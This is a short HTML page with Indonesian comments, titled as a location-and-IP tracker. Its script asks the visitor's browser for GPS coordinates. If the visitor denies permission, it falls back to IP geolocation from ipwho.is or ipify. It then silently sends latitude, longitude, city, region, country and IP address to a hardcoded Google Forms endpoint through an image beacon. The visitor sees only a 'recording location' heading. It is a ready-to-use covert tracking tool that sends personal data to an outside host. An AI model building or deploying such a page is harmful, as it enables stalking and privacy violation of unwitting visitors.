<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8"/>
  <title>Tracker Lokasi + IP (Final)</title>
</head>
<body>
  <h2>Sedang merekam lokasi…</h2>
  <script>
    // —– Ganti dengan URL formResponse mu —–
    const FORM_URL = 'https://docs.google.com/forms/d/e/1FAIpQLSdmCzOfz6cYaPXncwwhYKyeRX_ZUP6YhMmMWYKSSkGreLrURQ/formResponse';
    // —– Ganti entry IDs sesuai Form mu —–
    const F = {
      lat:  'entry.336954328',
      long: 'entry.122334606',
      acc:  'entry.1466949585',
      city: 'entry.1958665783',
      reg:  'entry.1713030934',
      id:   'entry.2142024660',
      ip:   'entry.1095561107'
    };

    // Kirim GET ke formResponse
    function submit(p) {
      new Image().src = FORM_URL + '?' + new URLSearchParams(p);
    }

    // Utama: pos = Position object (jika ada), atau null jika ditolak/tidak support
    function record(pos) {
      // Pertama: fetch IP+geo aproksimasi
      fetch('https://ipwho.is/json/')
        .then(r => r.json())
        .then(d => {
          // Siapkan payload
          const data = {};
          // GPS jika tersedia
          if (pos && pos.coords) {
            data[F.lat]  = pos.coords.latitude;
            data[F.long] = pos.coords.longitude;
            data[F.acc]  = pos.coords.accuracy;
          } else {
            data[F.lat]  = d.latitude ?? '';
            data[F.long] = d.longitude ?? '';
            data[F.acc]  = 'IP';
          }
          // Selalu kirim city/region/country dari ipwho.is
          data[F.city] = d.city;
          data[F.reg]  = d.region;
          data[F.id]   = d.country;
          // Kirim IP
          data[F.ip] = d.ip;
          // Submit
          submit(data);
        })
        .catch(() => {
          // Jika ipwho.is gagal → minimal kirim IP via ipify
          fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(j => {
              const data = {
                [F.ip]: j.ip,
                [F.acc]: 'error',
                [F.lat]: pos?.coords?.latitude ?? '',
                [F.long]: pos?.coords?.longitude ?? ''
              };
              if (pos && pos.coords) {
                // jika GPS ada, kirim juga akurasi
                data[F.acc] = pos.coords.accuracy;
              }
              submit(data);
            })
            .catch(() => {
              // benar-benar gagal semua
              submit({ [F.ip]: 'unknown' });
            });
        });
    }

    // Mulai: coba Geolocation
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        p => record(p),    // jika Allow
        _ => record(null), // jika Deny / timeout
        { timeout: 8000 }
      );
    } else {
      record(null);      // browser tak support
    }
  </script>
</body>
</html>
